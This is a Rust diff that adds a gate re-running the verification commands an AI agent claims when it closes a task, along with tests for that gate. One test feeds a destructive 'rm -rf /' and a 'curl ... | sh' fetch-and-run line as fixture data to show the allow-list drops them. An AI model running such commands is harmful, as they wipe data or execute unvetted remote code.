@@ -31,6 +31,8 @@ use crate::validation::{
     ValidationGate,
 };
 
+pub(crate) mod close_verification;
+
 /// Fleet-wide cooling period after an unsuccessful attempt.  The window grows
 /// across consecutive failures so another ready bead can run instead of every
 /// worker immediately reclaiming the same deterministic frontier entry.
@@ -417,6 +419,10 @@ pub struct OutcomeHandler {
     /// resolved through this handler?", which would deny every later
     /// wrapper-path dispatch its row.
     ledger_row_emitted: Arc<std::sync::Mutex<Option<String>>>,
+    /// Re-runs the verification commands a close reason claims, in a clean
+    /// extraction of committed state, before the close is honoured
+    /// ([`Self::verify_close_evidence`]).
+    close_verification: close_verification::CloseVerificationRuntime,
 }
 
 /// Close reason recorded when the shipped-work gate confirms an agent's work
@@ -433,6 +439,7 @@ impl OutcomeHandler {
             telemetry,
             attempt_context: Arc::new(std::sync::Mutex::new(None)),
             ledger_row_emitted: Arc::new(std::sync::Mutex::new(None)),
+            close_verification: close_verification::CloseVerificationRuntime::production(),
         }
     }
 
@@ -1666,6 +1673,39 @@ impl OutcomeHandler {
                 let attempt = self.peek_attempt_context();
                 let fallback = Self::fallback_predispatch(&attempt);
 
+                // Close-evidence gate: a close reason must carry a `verified:`
+                // block, and every verifiable command it claims — plus any
+                // `go test`/`cargo test` acceptance command the bead's own
+                // description names — is re-run in a clean extraction of
+                // committed state before the close is honoured. Runs before
+                // shipped-work's failure-count reset so a rejected close never
+                // benefits from one.
+                match self
+                    .verify_close_evidence(store, bead, current.body.as_deref())
+                    .await?
+                {
+                    close_verification::CloseEvidenceVerdict::Skipped
+                    | close_verification::CloseEvidenceVerdict::Pass => {}
+                    close_verification::CloseEvidenceVerdict::Fail(report) => {
+                        return self.handle_gate_failure(store, bead, &report).await;
+                    }
+                    close_verification::CloseEvidenceVerdict::ExecutionError {
+                        command,
+                        reason,
+                    } => {
+                        return self
+                            .handle_gate_error(
+                                store,
+                                bead,
+                                &bead.workspace.display().to_string(),
+                                close_verification::GATE_NAME,
+                                &command,
+                                &reason,
+                            )
+                            .await;
+                    }
+                }
+
                 if self.config.worker.enforce_shipped_work {
                     match verify_shipped_work(&current, &bead.workspace, store, fallback.as_ref())
                         .await
@@ -2017,6 +2057,106 @@ impl OutcomeHandler {
         }
 
         Ok((BeadAction::Closed, events))
+    }
+
+    /// Judge the close reason of a bead the agent has closed.
+    ///
+    /// The pluck prompt requires every close reason to end with a fenced
+    /// `verified:` block listing the commands the agent ran; this re-runs the
+    /// verifiable ones (plus the bead description's own acceptance commands)
+    /// in a clean extraction before the close is honoured. The gate applies
+    /// only where the backend can expose the close reason at all — everywhere
+    /// else it skips rather than judging closes it cannot see. A close reason
+    /// that cannot be *fetched* is a store hiccup, not missing evidence, so
+    /// it also fails open; a reason that plainly carries no block does not.
+    async fn verify_close_evidence(
+        &self,
+        store: &dyn BeadStore,
+        bead: &Bead,
+        description: Option<&str>,
+    ) -> Result<close_verification::CloseEvidenceVerdict> {
+        if !store.exposes_close_reason() {
+            tracing::debug!(
+                bead_id = %bead.id,
+                "backend cannot expose close reasons — close-evidence gate skipped"
+            );
+            return Ok(close_verification::CloseEvidenceVerdict::Skipped);
+        }
+
+        // Not `timeout_op`: its Ok(None) folds "store timed out" and "store
+        // returned nothing" into one value, and the two mean opposite things
+        // here — a timeout fails open, a fetched-empty reason is the missing
+        // evidence the gate exists to reject.
+        let close_reason = match tokio::time::timeout(
+            std::time::Duration::from_secs(30),
+            store.close_reason(&bead.id),
+        )
+        .await
+        {
+            Ok(Ok(reason)) => reason,
+            Ok(Err(e)) => {
+                tracing::warn!(
+                    bead_id = %bead.id,
+                    error = %e,
+                    "close reason could not be fetched — failing open, not rejecting the close"
+                );
+                return Ok(close_verification::CloseEvidenceVerdict::Skipped);
+            }
+            Err(_) => {
+                tracing::warn!(
+                    bead_id = %bead.id,
+                    "close_reason timed out after 30s — failing open, not rejecting the close"
+                );
+                return Ok(close_verification::CloseEvidenceVerdict::Skipped);
+            }
+        };
+
+        let Some(reason) = close_reason else {
+            tracing::warn!(
+                bead_id = %bead.id,
+                "bead closed with no close reason — rejecting the close"
+            );
+            return Ok(close_verification::CloseEvidenceVerdict::Fail(
+                GateReport::single_failure(
+                    close_verification::GATE_NAME,
+                    close_verification::MISSING_EVIDENCE_REASON,
+                ),
+            ));
+        };
+
+        let Some(claimed) = close_verification::parse_verified_block(&reason) else {
+            tracing::warn!(
+                bead_id = %bead.id,
+                "close reason carries no `verified:` block — rejecting the close"
+            );
+            return Ok(close_verification::CloseEvidenceVerdict::Fail(
+                GateReport::single_failure(
+                    close_verification::GATE_NAME,
+                    close_verification::MISSING_EVIDENCE_REASON,
+                ),
+            ));
+        };
+
+        let commands = close_verification::collect_rerun_commands(
+            bead.id.as_ref(),
+            &claimed,
+            description,
+            &bead.workspace,
+        );
+        if commands.is_empty() {
+            tracing::info!(
+                bead_id = %bead.id,
+                "close reason carries a verified block but no re-runnable command — honouring the close"
+            );
+            return Ok(close_verification::CloseEvidenceVerdict::Pass);
+        }
+
+        tracing::info!(
+            bead_id = %bead.id,
+            commands = commands.len(),
+            "re-running close-evidence commands in the clean extraction"
+        );
+        Ok(self.close_verification.verify(bead, &commands).await)
     }
 
     /// Handle gate failure: reopen the bead if it was closed, then release it.
@@ -3736,6 +3876,15 @@ mod tests {
         notes: Option<String>,
         /// Workspace-scoped records returned by `list_all()`.
         all_beads: Vec<Bead>,
+        /// Close reason the store reports for the closed bead. Setting it
+        /// also turns on `exposes_close_reason`, mirroring the real
+        /// capability split (bead-rs exposes close reasons, bf does not).
+        close_reason: Option<String>,
+        /// Whether this fake backend can expose close reasons at all.
+        exposes_close_reason: bool,
+        /// Description `show()` reports for the bead (defaults to the
+        /// `bead_in_workspace` fixture body).
+        description: Option<String>,
         fail_flush: bool,
     }
 
@@ -3749,6 +3898,9 @@ mod tests {
                 dependencies: Vec::new(),
                 notes: None,
                 all_beads: Vec::new(),
+                close_reason: None,
+                exposes_close_reason: false,
+                description: None,
                 fail_flush: false,
             }
         }
@@ -3765,6 +3917,20 @@ mod tests {
 
         fn with_all_beads(mut self, all_beads: Vec<Bead>) -> Self {
             self.all_beads = all_beads;
+            self
+        }
+
+        /// Report this close reason through a backend that exposes close
+        /// reasons (the close-evidence gate only applies to such backends).
+        fn with_close_reason(mut self, reason: &str) -> Self {
+            self.close_reason = Some(reason.to_string());
+            self.exposes_close_reason = true;
+            self
+        }
+
+        /// Make `show()` report this description for the bead.
+        fn with_description(mut self, description: &str) -> Self {
+            self.description = Some(description.to_string());
             self
         }
 
@@ -3857,6 +4023,14 @@ mod tests {
             Ok(self.notes.clone())
         }
 
+        fn exposes_close_reason(&self) -> bool {
+            self.exposes_close_reason
+        }
+
+        async fn close_reason(&self, _id: &BeadId) -> Result<Option<String>> {
+            Ok(self.close_reason.clone())
+        }
+
         async fn close(&self, id: &BeadId, reason: &str) -> Result<()> {
             self.actions
                 .lock()
@@ -3879,6 +4053,9 @@ mod tests {
             let mut bead = bead_in_workspace(self.show_status.clone(), self.workspace.path());
             bead.labels = self.labels.clone();
             bead.dependencies = self.dependencies.clone();
+            if let Some(description) = &self.description {
+                bead.body = Some(description.clone());
+            }
             Ok(bead)
         }
         async fn claim(&self, _id: &BeadId, _actor: &str) -> Result<ClaimResult> {
@@ -4279,6 +4456,277 @@ mod tests {
         assert!(
             !actions.iter().any(|a| matches!(a, StoreAction::Release(_))),
             "success should not release bead"
+        );
+    }
+
+    // ── close-evidence verification: re-run what the close reason claims ──
+
+    /// A handler judging closes through a fake runner and a pre-made
+    /// "extraction" directory, so no real child and no git checkout is
+    /// involved. Shipped-work enforcement is off: the mock store has no
+    /// predispatch snapshot and the close-evidence gate must be judged on
+    /// its own here.
+    fn close_evidence_handler(
+        helper: &crate::telemetry::test_utils::TestHelper,
+        runner: Arc<crate::process_runner::FakeProcessRunner>,
+    ) -> (OutcomeHandler, tempfile::TempDir) {
+        use crate::process_runner::ProcessRunner;
+
+        let extraction = tempfile::tempdir().unwrap();
+        let mut config = Config::default();
+        config.worker.enforce_shipped_work = false;
+        let mut handler = OutcomeHandler::new(config, helper.telemetry().clone());
+        handler.close_verification = close_verification::CloseVerificationRuntime::for_tests(
+            runner as Arc<dyn ProcessRunner>,
+            Some(extraction.path().to_path_buf()),
+        );
+        (handler, extraction)
+    }
+
+    #[tokio::test]
+    async fn close_without_verified_block_is_reopened_and_released() {
+        let (_guard, _home) = isolated_home();
+        let helper = crate::telemetry::test_utils::TestHelper::new("close-evidence-missing");
+        let (handler, _extraction) = close_evidence_handler(
+            &helper,
+            Arc::new(crate::process_runner::FakeProcessRunner::new()),
+        );
+        let store =
+            test_store(BeadStatus::Done).with_close_reason("did the work, everything is green");
+        let bead = test_bead(BeadStatus::InProgress);
+
+        let result = handler
+            .handle(&store, &bead, &test_output(0), false)
+            .await
+            .unwrap();
+
+        assert!(
+            matches!(result.bead_action, BeadAction::Released(_)),
+            "a close without evidence must be released, got {:?}",
+            result.bead_action
+        );
+        helper.sync().await;
+        let failed = helper.events_by_type("verification.failed");
+        assert_eq!(failed.len(), 1, "the rejection must be reported");
+        assert_eq!(
+            failed[0].data["output"],
+            close_verification::MISSING_EVIDENCE_REASON,
+            "the rejection reason must say the close carried no evidence"
+        );
+        assert!(
+            store
+                .actions()
+                .iter()
+                .any(|a| matches!(a, StoreAction::Reopen(_))),
+            "the closed bead must be reopened, got: {:?}",
+            store.actions()
+        );
+    }
+
+    #[tokio::test]
+    async fn failing_claimed_command_reopens_with_the_command_in_the_reason() {
+        use crate::process_runner::{FakeProcessRunner, ProcessOutput};
+
+        let (_guard, _home) = isolated_home();
+        let helper = crate::telemetry::test_utils::TestHelper::new("close-evidence-failing");
+        let runner = Arc::new(FakeProcessRunner::new());
+        runner.push_output(ProcessOutput {
+            success: false,
+            exit_code: Some(1),
+            stdout: b"running 3 tests\n".to_vec(),
+            stderr: b"error: test failed, to rerun pass `mod::test`\n".to_vec(),
+        });
+        let (handler, _extraction) = close_evidence_handler(&helper, runner);
+        let store = test_store(BeadStatus::Done).with_close_reason(
+            "implemented it\n```verified:\ngo test ./internal/crypto/ exit=0\n```",
+        );
+        let bead = test_bead(BeadStatus::InProgress);
+
+        let result = handler
+            .handle(&store, &bead, &test_output(0), false)
+            .await
+            .unwrap();
+
+        assert!(matches!(result.bead_action, BeadAction::Released(_)));
+        helper.sync().await;
+        let failed = helper.events_by_type("verification.failed");
+        assert_eq!(failed.len(), 1);
+        let reason = failed[0].data["output"].as_str().unwrap_or_default();
+        assert!(
+            reason.contains("go test ./internal/crypto/"),
+            "the reason must name the failed command, got: {reason}"
+        );
+        assert!(
+            reason.contains("error: test failed"),
+            "the reason must carry the command's output, got: {reason}"
+        );
+        assert!(
+            store
+                .actions()
+                .iter()
+                .any(|a| matches!(a, StoreAction::Reopen(_))),
+            "the closed bead must be reopened"
+        );
+    }
+
+    #[tokio::test]
+    async fn passing_claimed_command_honours_the_close() {
+        use crate::process_runner::{FakeProcessRunner, ProcessOutput};
+
+        let (_guard, _home) = isolated_home();
+        let helper = crate::telemetry::test_utils::TestHelper::new("close-evidence-passing");
+        let runner = Arc::new(FakeProcessRunner::new());
+        runner.push_output(ProcessOutput::success(b"test result: ok\n".to_vec()));
+        let (handler, extraction) = close_evidence_handler(&helper, runner.clone());
+        let store = test_store(BeadStatus::Done)
+            .with_close_reason("done\n```verified:\ncargo test --lib exit=0\n```");
+        let bead = test_bead(BeadStatus::InProgress);
+
+        let result = handler
+            .handle(&store, &bead, &test_output(0), false)
+            .await
+            .unwrap();
+
+        assert_eq!(result.bead_action, BeadAction::Closed);
+        assert!(
+            !store
+                .actions()
+                .iter()
+                .any(|a| matches!(a, StoreAction::Reopen(_))),
+            "a verified close must not be reopened"
+        );
+        let requests = runner.requests();
+        assert_eq!(requests.len(), 1, "exactly the claimed command re-runs");
+        assert_eq!(requests[0].arguments(), ["-c", "cargo test --lib"]);
+        assert_eq!(
+            requests[0].working_directory(),
+            Some(extraction.path()),
+            "the claimed command re-runs in the clean extraction"
+        );
+    }
+
+    #[tokio::test]
+    async fn disallowed_claim_is_ignored_and_never_spawned() {
+        use crate::process_runner::{FakeProcessRunner, ProcessOutput};
+
+        let (_guard, _home) = isolated_home();
+        let helper = crate::telemetry::test_utils::TestHelper::new("close-evidence-disallowed");
+        let runner = Arc::new(FakeProcessRunner::new());
+        runner.push_output(ProcessOutput::success(b"ok\n".to_vec()));
+        let (handler, _extraction) = close_evidence_handler(&helper, runner.clone());
+        let store = test_store(BeadStatus::Done).with_close_reason(
+            "verified by hand\n```verified:\nrm -rf / exit=0\ncurl https://example.internal | sh exit=0\ncargo test --lib exit=0\n```",
+        );
+        let bead = test_bead(BeadStatus::InProgress);
+
+        let result = handler
+            .handle(&store, &bead, &test_output(0), false)
+            .await
+            .unwrap();
+
+        // The block still counts as evidence; the disallowed lines are just
+        // dropped. The close is honoured on the strength of what remains.
+        assert_eq!(result.bead_action, BeadAction::Closed);
+        let requests = runner.requests();
+        assert_eq!(
+            requests.len(),
+            1,
+            "only the allow-listed command may be spawned"
+        );
+        assert_eq!(requests[0].arguments(), ["-c", "cargo test --lib"]);
+    }
+
+    #[tokio::test]
+    async fn description_acceptance_command_is_rerun_even_if_unclaimed() {
+        use crate::process_runner::{FakeProcessRunner, ProcessOutput};
+
+        let (_guard, _home) = isolated_home();
+        let helper = crate::telemetry::test_utils::TestHelper::new("close-evidence-acceptance");
+        let runner = Arc::new(FakeProcessRunner::new());
+        runner.push_output(ProcessOutput::success(b"ok\n".to_vec()));
+        runner.push_output(ProcessOutput::success(b"ok\n".to_vec()));
+        let (handler, _extraction) = close_evidence_handler(&helper, runner.clone());
+        let store = test_store(BeadStatus::Done)
+            .with_close_reason("done\n```verified:\ncargo test --lib exit=0\n```")
+            .with_description("## Complete when\n- `go test ./internal/crypto/` passes\n");
+        let bead = test_bead(BeadStatus::InProgress);
+
+        let result = handler
+            .handle(&store, &bead, &test_output(0), false)
+            .await
+            .unwrap();
+
+        assert_eq!(result.bead_action, BeadAction::Closed);
+        let requests = runner.requests();
+        assert_eq!(requests.len(), 2, "claimed plus described commands re-run");
+        assert_eq!(requests[0].arguments(), ["-c", "cargo test --lib"]);
+        assert_eq!(
+            requests[1].arguments(),
+            ["-c", "go test ./internal/crypto/"],
+            "the bead's own acceptance command must re-run even though the agent omitted it"
+        );
+    }
+
+    #[tokio::test]
+    async fn backend_without_close_reasons_skips_the_gate() {
+        let (_guard, _home) = isolated_home();
+        let helper = crate::telemetry::test_utils::TestHelper::new("close-evidence-skip");
+        let (handler, _extraction) = close_evidence_handler(
+            &helper,
+            Arc::new(crate::process_runner::FakeProcessRunner::new()),
+        );
+        // No with_close_reason: the mock backend cannot expose close reasons
+        // (the bf shape), so the gate does not apply and the close stands.
+        let store = test_store(BeadStatus::Done);
+        let bead = test_bead(BeadStatus::InProgress);
+
+        let result = handler
+            .handle(&store, &bead, &test_output(0), false)
+            .await
+            .unwrap();
+
+        assert_eq!(result.bead_action, BeadAction::Closed);
+        assert!(!store
+            .actions()
+            .iter()
+            .any(|a| matches!(a, StoreAction::Reopen(_))));
+    }
+
+    #[tokio::test]
+    async fn unusable_extraction_releases_without_a_failure_count() {
+        let (_guard, _home) = isolated_home();
+        let helper = crate::telemetry::test_utils::TestHelper::new("close-evidence-noextraction");
+        // Production runtime, no extraction override: the fixture workspace
+        // is not a git repository, so extracting committed state must fail.
+        let mut config = Config::default();
+        config.worker.enforce_shipped_work = false;
+        let handler = OutcomeHandler::new(config, helper.telemetry().clone());
+        let store = test_store(BeadStatus::Done)
+            .with_close_reason("done\n```verified:\ncargo test --lib exit=0\n```");
+        let bead = test_bead(BeadStatus::InProgress);
+
+        let result = handler
+            .handle(&store, &bead, &test_output(0), false)
+            .await
+            .unwrap();
+
+        assert!(
+            matches!(result.bead_action, BeadAction::Released(_)),
+            "no extraction means no verdict, got {:?}",
+            result.bead_action
+        );
+        assert!(
+            !store.actions().iter().any(
+                |a| matches!(a, StoreAction::AddLabel(_, l) if l.starts_with("failure-count:"))
+            ),
+            "an execution error is not the bead's failure — no failure-count increment"
+        );
+        assert!(
+            !store
+                .actions()
+                .iter()
+                .any(|a| matches!(a, StoreAction::Reopen(_))),
+            "the bead was never closed in this store's view; no reopen expected"
         );
     }
 
